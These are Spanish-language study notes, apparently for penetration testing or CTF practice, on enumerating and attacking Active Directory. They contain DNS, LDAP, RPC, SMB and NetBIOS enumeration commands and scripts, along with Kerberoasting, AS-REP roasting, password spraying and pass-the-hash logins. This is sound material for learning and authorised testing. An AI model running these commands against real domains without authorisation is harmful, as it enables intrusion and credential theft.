---
title: "Apuntes AD"
description: "Descripcion"
date: "2025-12-16"
tags: ["AD"]
---

## Primeros Pasos

```bash
sudo fping -g 192.168.1.0 192.168.1.255 -a -u
sudo fping -g 10.10.10.0/24 2>&1 | grep alive
sudo fping -f hosts.txt -a
```

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
nslookup -type=NS domain.local
nslookup -type=TXT domain.local
dig @DC_IP SRV _ldap._tcp.dc._msdcs.domain.local
dig AXFR domain.local @DC_IP
dig any domain.local
dnsenum domain.local

```




```bash

nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
nmap -p 88,389,445 --script krb5-enum-users,ldap-rootdse,smb-os-discovery <IP_DC>`
nmap -p 445 --script smb-os-discovery 10.10.10.10
nmap -p 389 --script ldap-rootdse 10.10.10.10
nmap -p 135 --script rpcinfo 10.10.10.10
nmap -p 3389 --script rdp-ntlm-info 10.10.10.10
```

```bash

# ✅ ENUM4LINUX — Enumeración automática inicial

enum4linux -a 10.10.10.10 
enum4linux -a -u "" -p "" 10.10.10.10

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# ✅ NXC / CRACKMAPEXEC — Enumeración estándar de dominio

## SMB

nxc smb 10.10.10.10 --shares --users --groups --pass-pol --sessions --local-auth
nxc smb 10.10.10.10 -u usuario -p password --shares --users --groups --sessions


## LDAP

nxc ldap 10.10.10.10 --users --groups --computers
nxc ldap 10.10.10.10 -u usuario -p password --users --groups --computers


## Con credenciales

nxc smb 10.10.10.10 -u usuario -p password 
nxc ldap 10.10.10.10 -u usuario -p password
nxc smb 10.10.10.0/24

# ✅ SMBCLIENT — Detección de comparticiones

smbclient -L //<IP> -N 
smbclient -L //<IP> -U ""


# ✅ RPCCLIENT — Enumeración estructural básica

rpcclient -U "" -N <IP> 
enumdomusers 
enumdomgroups 
getdompwinfo 
enumdomcomputers 
lsaquery

```
---

## Reconocimiento y enumeracion en detalle


### 🟦 OBTENER INFORMACIÓN:

`53   DNS 389  LDAP 3268 Global Catalog 135  RPC Mapper 137  NetBIOS 9389 ADWS`

---

### ✅ (53)   Enumerar DNS 

|Información Obtenida|Impacto Directo|
|---|---|
|Dominio interno|Ataques Kerberos|
|Domain Controllers|Compromiso total|
|Servidores SQL|Robo de datos|
|FileServers|Exfiltración|
|Exchange / Mail|Phishing / Relay|
|Servidores Web|Vector inicial|
|IPs internas|Movimiento lateral|
|Infraestructura VPN|Ataque perimetral|
|Transferencia de zona|Compromiso total|

---
- Comandos comunes

```bash

nslookup dominio.local
dig dominio.local
nslookup -type=SRV _ldap._tcp.dc._msdcs.dominio.local
dig _ldap._tcp.dc._msdcs.dominio.local SRV
dnsenum dominio.local
dnsrecon -d dominio.local
dnsmap dominio.local
dnsrecon -d dominio.local -D wordlist.txt -t brt
dig MX dominio.local
dig NS dominio.local
dig TXT dominio.local
dig AXFR dominio.local @IP
dnsrecon -d dominio.local -t axfr
dnsrecon -r 10.10.10.0/24

```

- Script enumeracion DNS

```bash

#!/bin/bash

# ===============================
# DNS ENUMERATION AUTOMÁTICO
# Autor: Red Team AD
# Uso: ./dns_enum.sh dominio.local 10.10.10.5
# ===============================

if [ $# -ne 2 ]; then
  echo "Uso: $0 <dominio> <IP_DNS>"
  exit 1
fi

DOMAIN=$1
DNSIP=$2
DATE=$(date +"%Y%m%d_%H%M%S")
OUTDIR="dns_enum_$DOMAIN_$DATE"

mkdir -p $OUTDIR

echo "[+] Iniciando enumeración DNS sobre: $DOMAIN"
echo "[+] Servidor DNS: $DNSIP"
echo "[+] Resultados en: $OUTDIR"
echo "--------------------------------------------"

# 1. Resolución directa del dominio
echo "[+] Resolviendo dominio..."
dig $DOMAIN @$DNSIP > $OUTDIR/01_resolve_domain.txt

# 2. Registros NS
echo "[+] Enumerando servidores DNS (NS)..."
dig NS $DOMAIN @$DNSIP > $OUTDIR/02_ns_records.txt

# 3. Registros MX
echo "[+] Enumerando servidores de correo (MX)..."
dig MX $DOMAIN @$DNSIP > $OUTDIR/03_mx_records.txt

# 4. Registros TXT
echo "[+] Enumerando registros TXT..."
dig TXT $DOMAIN @$DNSIP > $OUTDIR/04_txt_records.txt

# 5. Domain Controllers por SRV
echo "[+] Descubriendo Domain Controllers (SRV)..."
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV @$DNSIP > $OUTDIR/05_dc_srv_records.txt

# 6. Intento de transferencia de zona (AXFR)
echo "[+] Intentando transferencia de zona (AXFR)..."
dig AXFR $DOMAIN @$DNSIP > $OUTDIR/06_zone_transfer.txt

# 7. Enumeración con dnsrecon
if command -v dnsrecon &> /dev/null; then
  echo "[+] Ejecutando dnsrecon..."
  dnsrecon -d $DOMAIN -n $DNSIP > $OUTDIR/07_dnsrecon.txt
else
  echo "[-] dnsrecon no está instalado"
fi

# 8. Enumeración con dnsenum
if command -v dnsenum &> /dev/null; then
  echo "[+] Ejecutando dnsenum..."
  dnsenum $DOMAIN > $OUTDIR/08_dnsenum.txt
else
  echo "[-] dnsenum no está instalado"
fi

echo "--------------------------------------------"
echo "[✅] Enumeración DNS finalizada"
echo "[📂] Revisa los resultados en: $OUTDIR"

```

- Script V.2.0 con diccionario de fuerza bruta

```bash

#!/bin/bash

# ===============================
# DNS ENUM CTF AUTOMATIZADO
# Solo DNS - Optimizado para CTF
# Uso: ./dns_ctf_enum.sh dominio.local 10.10.10.5 wordlist.txt
# ===============================

if [ $# -lt 2 ]; then
  echo "Uso: $0 <dominio> <IP_DNS> [wordlist]"
  exit 1
fi

DOMAIN=$1
DNSIP=$2
WORDLIST=$3
DATE=$(date +"%Y%m%d_%H%M%S")
OUTDIR="CTF_DNS_$DOMAIN_$DATE"

mkdir -p $OUTDIR

echo "[+] OBJETIVO: $DOMAIN"
echo "[+] DNS: $DNSIP"
echo "[+] SALIDA: $OUTDIR"
echo "--------------------------------------------"

# 1. Resolución directa
dig $DOMAIN @$DNSIP +noall +answer > $OUTDIR/01_domain.txt

# 2. Servidores DNS
dig NS $DOMAIN @$DNSIP +noall +answer > $OUTDIR/02_ns.txt

# 3. Servidores de correo
dig MX $DOMAIN @$DNSIP +noall +answer > $OUTDIR/03_mx.txt

# 4. Registros TXT
dig TXT $DOMAIN @$DNSIP +noall +answer > $OUTDIR/04_txt.txt

# 5. Domain Controllers (SRV)
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV @$DNSIP +noall +answer > $OUTDIR/05_dc.txt

# 6. Transferencia de zona (AXFR)
dig AXFR $DOMAIN @$DNSIP > $OUTDIR/06_axfr.txt

# 7. Fuerza bruta DNS (si hay wordlist)
if [ ! -z "$WORDLIST" ]; then
    echo "[+] Fuerza bruta con wordlist..."
    while read sub; do
        host $sub.$DOMAIN $DNSIP | grep "has address" >> $OUTDIR/07_bruteforce.txt
    done < $WORDLIST
fi

# 8. PTR Reverse básico del DC si existe
DCIP=$(grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" $OUTDIR/05_dc.txt | head -n 1)

if [ ! -z "$DCIP" ]; then
    dig -x $DCIP @$DNSIP +noall +answer > $OUTDIR/08_reverse_dc.txt
fi

# 9. Extracción automática de IPs encontradas
grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" $OUTDIR/* | sort -u > $OUTDIR/IPs_encontradas.txt

echo "--------------------------------------------"
echo "[✅] DNS ENUM CTF COMPLETADO"
echo "[📌] IPs encontradas:"
cat $OUTDIR/IPs_encontradas.txt

```

---

### ✅ (389)  Enumerar LDAP 
---

|**Información Obtenida por LDAP**|**Impacto Directo en Ataque**|
|---|---|
|**Usuarios (sAMAccountName)**|Base para **fuerza bruta**, **password spraying**, **AS-REP Roasting**, **Kerberoasting**|
|**Domain Admins (miembros)**|Identifica **objetivos de máximo privilegio** para escalada|
|**Equipos (computer, dNSHostName)**|Define **objetivos de movimiento lateral**|
|**Cuentas sin preautenticación Kerberos**|Permite **AS-REP Roasting** sin credenciales|
|**Cuentas con SPN**|Permite **Kerberoasting**|
|**Grupos de seguridad**|Mapea **rutas de escalada de privilegios**|
|**OU (Organizational Units)**|Identifica **segmentación y jerarquía del dominio**|
|**Política de contraseñas**|Ajusta **estrategias de fuerza bruta / spraying**|
|**Trusts entre dominios**|Habilita **ataques entre dominios**|
|**Usuarios con Password Never Expires**|**Cuentas ideales para persistencia**|
|**Usuarios con adminCount=1**|Identifica **cuentas privilegiadas reales**|
|**Delegaciones Kerberos**|Posibilita **escaladas avanzadas (S4U, impersonación)**|
|**Descripciones de usuario**|Fuga de **contraseñas en claro o pistas internas**|
|**SID del dominio**|Necesario para **Golden Ticket / Silver Ticket**|
|**Cuentas de servicio**|Objetivos críticos para **Kerberoasting y persistencia**|

---

- Comandos comunes

```bash

ldapsearch -x -H ldap://IP -s base
ldapsearch -x -H ldap://IP -s base namingcontexts
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(objectClass=user)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" sAMAccountName
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(description=*)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(objectClass=group)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(cn=Domain Admins)" member
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(objectClass=computer)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" dNSHostName
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(objectClass=organizationalUnit)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(objectClass=domain)"
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local" "(servicePrincipalName=*)"
ldapsearch -x -H ldap://IP -D "user@dominio.local" -w password -b "DC=dominio,DC=local"

```

- Script enumeracion LDAP ldap_enum_only.sh

```bash
#!/bin/bash

# ===============================
# LDAP ENUMERATION ONLY
# SOLO LDAP - SIN OTROS SERVICIOS
# Uso:
#   ./ldap_enum_only.sh <IP_LDAP>
#   ./ldap_enum_only.sh <IP_LDAP> <USER_DN> <PASSWORD>
# ===============================

if [ $# -lt 1 ]; then
  echo "Uso:"
  echo "  $0 <IP_LDAP>"
  echo "  $0 <IP_LDAP> <USER_DN> <PASSWORD>"
  exit 1
fi

IP=$1
USERDN=$2
PASS=$3
DATE=$(date +"%Y%m%d_%H%M%S")
OUTDIR="LDAP_ENUM_$IP_$DATE"

mkdir -p $OUTDIR

if [ -z "$USERDN" ]; then
  AUTH="-x"
  echo "[+] Modo: LDAP anónimo"
else
  AUTH="-x -D $USERDN -w $PASS"
  echo "[+] Modo: LDAP autenticado"
fi

echo "[+] Objetivo LDAP: $IP"
echo "[+] Resultados en: $OUTDIR"
echo "--------------------------------------------"

# 1. RootDSE
ldapsearch $AUTH -H ldap://$IP -s base > $OUTDIR/01_rootdse.txt

# 2. Naming Contexts
ldapsearch $AUTH -H ldap://$IP -s base namingcontexts > $OUTDIR/02_namingcontexts.txt

# Extraer Base DN automáticamente
BASEDN=$(grep -i "namingContexts:" $OUTDIR/02_namingcontexts.txt | head -n 1 | awk '{print $2}')

echo "[+] Base DN detectado: $BASEDN"

# 3. Dump completo del dominio
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" > $OUTDIR/03_full_dump.txt

# 4. Usuarios
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(objectClass=user)" sAMAccountName description > $OUTDIR/04_users.txt

# 5. Grupos
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(objectClass=group)" > $OUTDIR/05_groups.txt

# 6. Miembros de Domain Admins
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(cn=Domain Admins)" member > $OUTDIR/06_domain_admins.txt

# 7. Equipos
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(objectClass=computer)" dNSHostName > $OUTDIR/07_computers.txt

# 8. Organizational Units
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(objectClass=organizationalUnit)" > $OUTDIR/08_ou.txt

# 9. Política de contraseñas
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(objectClass=domain)" minPwdLength maxPwdAge lockoutThreshold > $OUTDIR/09_password_policy.txt

# 10. Usuarios con SPN (Kerberoast targets)
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName > $OUTDIR/10_spn_users.txt

# 11. Usuarios sin preauth Kerberos (AS-REP)
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName > $OUTDIR/11_asrep_users.txt

# 12. Usuarios con contraseñas que no expiran
ldapsearch $AUTH -H ldap://$IP -b "$BASEDN" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName > $OUTDIR/12_pwd_never_expires.txt

echo "--------------------------------------------"
echo "[✅] ENUMERACIÓN LDAP COMPLETADA"
echo "[📂] Directorio de salida: $OUTDIR"
```

---

### 🟨 (135)  Enumerar RPC

|**Información Obtenida (vía RPC)**|**Impacto Directo en Ataque**|
|---|---|
|**Lista de usuarios del dominio**|Base para **password spraying**, **fuerza bruta**, **AS-REP**, **Kerberoast**|
|**Lista de grupos**|Identificación de **rutas de escalada**|
|**Miembros de grupos privilegiados**|Detección de **objetivos de alto valor**|
|**Política de contraseñas**|Ajuste de **estrategias de cracking**|
|**Listado de equipos**|Planificación de **movimiento lateral**|
|**Sesiones activas**|Identificación de **usuarios logueados**|
|**Shares remotos**|Posible **acceso a datos sensibles**|
|**Servicios remotos**|Evaluación de **vectores de ejecución remota**|
|**SID del dominio**|Necesario para **Golden Ticket**|
|**Cuentas bloqueadas/deshabilitadas**|Evita ruido en ataques|

---
- Comandos 

```bash

rpcclient -U "" -N <IP>
rpcclient -U usuario%password <IP>

enumdomusers
enumdomgroups
querygroupmem <RID>
getdompwinfo
enumdomcomputers
netshareenum
srvinfo
queryuser <RID>
lsaquery

```
---

### 🟪 (137)  Enumerar NetBIOS

|**Información Obtenida por NetBIOS**|**Impacto Directo en Ataque**|
|---|---|
|**Nombre del equipo (Hostname)**|Identifica **objetivos reales** para movimiento lateral|
|**Nombre del dominio**|Permite **orientar ataques de credenciales correctamente**|
|**Usuarios logueados**|Identificación de **cuentas activas para PTH / relay**|
|**Rol del sistema (DC, Workstation, Server)**|Prioriza **objetivos críticos (DC primero)**|
|**Dirección MAC**|Identificación de **dispositivo para pivoting**|
|**Grupos NetBIOS**|Ayuda a detectar **equipos administrativos**|
|**Presencia de NetBIOS en red**|Confirma **segmentos vulnerables a ataques legacy**|

---
- Comandos

```bash

nmblookup -A <IP>
nmblookup -M <DOMINIO>
nmblookup -S <HOSTNAME>

nbtscan <IP>
nbtscan <RANGO_CIDR>
nbtscan -v <IP>
nbtscan -r <RANGO_CIDR>
nbtscan -s : <RANGO_CIDR>

netbios-scan <IP>
netbios-scan <RANGO_CIDR>
netbios-scan -v <IP>

nmap -p 137 --script nbstat <IP>
nmap -sU -p 137 <IP>

crackmapexec smb <RANGO_CIDR> --netbios

```
---
### ✅ (88)   Enumerar Kerberos


|**Información Obtenida por Kerberos**|**Impacto Directo en Ataque**|
|---|---|
|Usuarios válidos del dominio|Base para **password spraying, AS-REP y Kerberoast**|
|Cuentas sin preautenticación|Permite **AS-REP Roasting sin credenciales**|
|Cuentas con SPN|Permite **Kerberoasting**|
|Nombre del dominio Kerberos|Necesario para **ataques dirigidos correctamente**|
|Hostname del Domain Controller|Objetivo directo para **sincronización de tickets**|
|Tipo de cifrado soportado|Determina **fuerza del hash para crackeo**|
|Tickets TGT válidos|Permite **Pass-the-Ticket**|
|Tickets TGS de servicios|Permite **Kerberoasting + movimiento lateral**|
|Usuarios de servicios críticos|Objetivos para **persistencia**|
|Políticas Kerberos|Ajuste de ataques de **fuerza bruta y spraying**|

---

- Comandos

```bash

kerbrute userenum -d dominio.local --dc <IP> usuarios.txt

impacket-GetNPUsers dominio.local/ -no-pass -usersfile usuarios.txt -dc-ip <IP>

impacket-GetUserSPNs dominio.local/usuario:password -dc-ip <IP> -request
impacket-GetUserSPNs dominio.local/usuario -hashes :NTLM -dc-ip <IP> -request

impacket-getTGT dominio.local/usuario:password

export KRB5CCNAME=ticket.ccache
klist

kerbrute passwordspray -d dominio.local usuarios.txt password.txt --dc <IP>
```

---

### ✅ (5985) Enumerar WinRM



|**Información Obtenida por WinRM**|**Impacto Directo en Ataque**|
|---|---|
|WinRM habilitado en el host|Confirma **vector directo de acceso remoto**|
|Usuario válido con acceso WinRM|Permite **shell remota inmediata**|
|Nivel de privilegios del usuario|Define si hay **compromiso total o acceso limitado**|
|Dominio del host|Permite **movimiento lateral autenticado**|
|Nombre del equipo|Identificación de **objetivo específico**|
|Versión de PowerShell|Compatibilidad con **payloads y scripts ofensivos**|
|Configuración de TrustedHosts|Facilita **conexiones remotas sin restricciones**|
|Sesiones activas|Detección de **usuarios reales conectados**|
|Variables de entorno|Descubrimiento de **rutas sensibles y tokens**|
|Software instalado|Identificación de **vectores de post-explotación**|

---

- Comandos

```bash

nmap -p 5985 --script http-windows-remote-management <IP>

evil-winrm -i <IP> -u usuario -p password
evil-winrm -i <IP> -u usuario -H <NTLM>
evil-winrm -i <IP> -r dominio.local

nxc winrm <IP> -u usuario -p password
nxc winrm <IP> -u usuario -H <NTLM>
nxc winrm <RANGO> -u usuarios.txt -p passwords.txt
nxc winrm <IP> -u usuario -p password -x "whoami"

whoami
hostname
ipconfig
systeminfo
net user
net localgroup administrators
```
---


### ✅ (445)  Enumerar SMB


|**Información Obtenida por SMB**|**Impacto Directo en Ataque**|
|---|---|
|Usuarios del dominio|Base para **password spraying / fuerza bruta**|
|Shares accesibles|**Robo directo de información sensible**|
|Política de contraseñas|Ajuste fino de **spraying**|
|Sistemas operativos|Selección de **exploits compatibles**|
|Sesiones activas|**Pass-the-Hash dirigido**|
|Permisos en shares|**Escalada por ficheros sensibles**|
|Hashes NTLM (si hay relay/dump)|**Compromiso total por PTH**|
|Equipos del dominio|**Movimiento lateral**|
|Grupo Administrators|**Objetivos de escalada inmediata**|

---

- Comandos

```bash
nmap -p 445 <IP>
nmap -p 445 --script smb-os-discovery <IP>

smbclient -L //<IP> -N
smbclient //<IP>/share -N

nxc smb <IP>
nxc smb <IP> --users
nxc smb <IP> --shares
nxc smb <IP> --groups
nxc smb <IP> --pass-pol

nxc smb <IP> -u usuario -p password
nxc smb <IP> -u usuario -H <NTLM>
```

---

### ✅ (3389) Enumerar RDP


|**Información Obtenida por RDP**|**Impacto Directo en Ataque**|
|---|---|
|RDP habilitado|Confirma **vector de acceso interactivo**|
|Dominio del host|Permite **ataques dirigidos por dominio**|
|Usuario válido|**Acceso directo al sistema**|
|Nivel de privilegio del usuario|Define si hay **compromiso total**|
|Nombre del equipo|Identificación clara del **objetivo**|
|NTLM del host|Utilizable para **PTH y relay**|
|Sesiones activas|Detección de **usuarios reales conectados**|

---

- Comandos

```bash
nmap -p 3389 <IP>
nmap -p 3389 --script rdp-ntlm-info <IP>

xfreerdp /v:<IP> /u:usuario /p:password
xfreerdp /v:<IP> /u:usuario /pth:<NTLM>

nxc rdp <IP> -u usuario -p password
nxc rdp <IP> -u usuario -H <NTLM>
nxc rdp <RANGO> -u usuarios.txt -p passwords.txt
```

---



---

